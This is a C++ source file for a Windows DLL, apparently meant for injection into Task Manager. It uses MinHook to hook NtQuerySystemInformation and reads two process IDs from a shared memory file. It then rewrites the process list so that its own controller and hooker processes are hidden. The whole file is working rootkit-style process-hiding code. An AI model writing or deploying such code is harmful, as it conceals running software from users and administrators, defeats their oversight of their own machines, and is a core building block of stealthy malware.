#undef UNICODE

// ------------------ INCLUDES ------------------------
#include "../headers/definitions.h"

#include "MinHook.h"
#include "../../commonUtils/headers/Logger.h"
#include "../../commonUtils/headers/memmapfile.h"


// ------------------ LIBRARIES -----------------------

#if defined _M_X64
#pragma comment(lib, "libMinHook.x64.lib")
#elif defined _M_IX86
#pragma comment(lib, "libMinHook.x86.lib")
#endif



#define MAX_BUFFER_SIZE 1024 //1k
#define INIT_URL_NUM 10

// ----------------------------------- GLOBALS -----------------------------------------------
char g_logfilename[125] = "F:\\gitmain\\ProcessControlProj\\ProcessControl\\ProcessControl\\logging\\dll_log";
Logger *g_logger = NULL;
FARPROC g_fpQuerySysInfo;

DWORD g_processContollPID;
DWORD g_taskmgrHookerPID;

//------------------------------------- NtQuerySystemInformation HOOK ------------------------------------------
typedef NTSTATUS(WINAPI *NTQSYSINFO)(_In_ SYSTEM_INFORMATION_CLASS, _Inout_ PVOID, _In_ ULONG, _Out_opt_ PULONG);

// Pointer to trampoline function, it will be used to call real (not detoured) function
NTQSYSINFO realNtQuerySystemInfo = NULL;

__declspec(dllexport) NTSTATUS WINAPI MyNtQuerySystemInformation(_In_       SYSTEM_INFORMATION_CLASS SystemInformationClass,
                                                                 _Inout_    PVOID SystemInformation,
                                                                 _In_       ULONG SystemInformationLength,
                                                                 _Out_opt_  PULONG ReturnLength)
{
    NTSTATUS res = realNtQuerySystemInfo(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

    if (!NT_SUCCESS(res) || SystemInformationClass != SystemProcessInformation)
        return res;
    

    // trying to skip processes with g_processContollPID and g_taskmgrHookerPID ids
    PSYSTEM_PROCESS_INFO curInfo = (PSYSTEM_PROCESS_INFO)SystemInformation;
    PSYSTEM_PROCESS_INFO prevInfo = NULL;
    PSYSTEM_PROCESS_INFO nextInfo = NULL;
    while (curInfo) {
        if (!curInfo->NextEntryOffset) {
            nextInfo = NULL;
        }
        else {
            nextInfo = (PSYSTEM_PROCESS_INFO)(((LPBYTE)curInfo) + curInfo->NextEntryOffset);
        }
        // if process is our target process to skip in process list, we 
        // rewrite "next" pointer in previous process so it's points to next after current
        if ((DWORD)curInfo->ProcessId == g_processContollPID ||
            (DWORD)curInfo->ProcessId == g_taskmgrHookerPID) {
            if (prevInfo != NULL) {
                prevInfo->NextEntryOffset += curInfo->NextEntryOffset;
                if (!curInfo->NextEntryOffset)
                    prevInfo->NextEntryOffset = 0;
            }
            else {
                // can happen only once
                SystemInformation = nextInfo;
            }
        }
        else {
            // if we want to skip current process (curInfo) we 
            // do need to retain prevInfo pointer
            prevInfo = curInfo;
        }
        curInfo = nextInfo;
    }


    return res;
}


static void readPIDSFromSharedFile() {
    g_logger->info("Trying to read from shared mem");
    const char SHARED_FILE_WITH_PIDS_NAME[] = "Global\\TaskmgrHookerPIDSFile";
    const size_t MAX_DIGIT_NUM = 15;
    my_shared_mem::MemMappedFile file;
    if (!file.openExisting(SHARED_FILE_WITH_PIDS_NAME, (MAX_DIGIT_NUM + 1) * 2, FILE_MAP_READ)) {
        g_logger->error("Cannot open shared file! err code: %i", GetLastError());
    }
    file.readDecimal(&g_processContollPID);
    g_logger->info("ProcessControll.exe pid read: %lu", g_processContollPID);
    file.readDecimal(&g_taskmgrHookerPID);
    g_logger->info("tasmgrHooker pid read: %lu", g_taskmgrHookerPID);
}

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD dwReason, LPVOID reserved)
{
    //MessageBox(NULL, "TEXT", "TEXT", MB_OK);
    if (dwReason == DLL_PROCESS_ATTACH) {
        DWORD pid = GetCurrentProcessId(); // hope process id will fit in integer
        char strpid[12];
        _ultoa_s(pid, strpid, 10);
        strcat_s(g_logfilename, strpid);
        strcat_s(g_logfilename, "taskmgr.txt");

        g_logger = new Logger(g_logfilename, true);

        g_logger->info("Reading shared file");
        readPIDSFromSharedFile();

        g_fpQuerySysInfo = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQuerySystemInformation");

        g_logger->info("Dll process attach.");
        g_logger->info("initializing hook");
        // Creating a HOOK
        if (MH_Initialize() != MH_OK) {
            g_logger->error("Cannot initialize minhook!");
            return 1;
        }
        if (MH_CreateHook(g_fpQuerySysInfo,
            &MyNtQuerySystemInformation,
            reinterpret_cast<void**>(&realNtQuerySystemInfo)) != MH_OK) {

            g_logger->error("Cannot create hook!");
            return 1;
        }
        if (MH_EnableHook(g_fpQuerySysInfo) != MH_OK) {
            g_logger->error("Cannot enable hook!");
            return 1;
        }

    }
    else if (dwReason == DLL_THREAD_ATTACH) {
        g_logger->info("Dll thread attach.");
    }
    else if (dwReason == DLL_PROCESS_DETACH) {
        g_logger->info("Dll detach.");

        if (MH_DisableHook(g_fpQuerySysInfo) != MH_OK) {
            g_logger->error("Cannot disable hook!");
            return 1;
        }

        if (MH_Uninitialize() != MH_OK) {
            g_logger->error("Cannot uninit minhook!");
            return 1;
        }

        //delete g_logger;
    }
    return TRUE;
}